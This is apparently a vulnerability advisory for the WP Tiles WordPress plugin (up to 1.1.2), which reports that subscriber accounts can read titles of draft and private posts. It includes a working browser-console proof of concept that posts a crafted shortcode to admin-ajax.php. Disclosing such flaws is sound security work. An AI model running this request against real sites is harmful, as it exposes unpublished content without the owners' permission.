## WordPress Plugin Vulnerabilities

# WP Tiles <= 1.1.2 - Subscriber+ Draft/Private Post Title Disclosure

### Description

The plugin does not ensure that posts to be displayed are not draft/private, allowing any authenticated users, such as subscriber to retrieve the titles of draft and privates posts for example. AN attacker could also retrieve the title of any other type of post.

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber user
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[wp-tiles post\_status='draft']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
This will display the titles of all draft posts. Change post\_status to private for private posts, or any to list everything
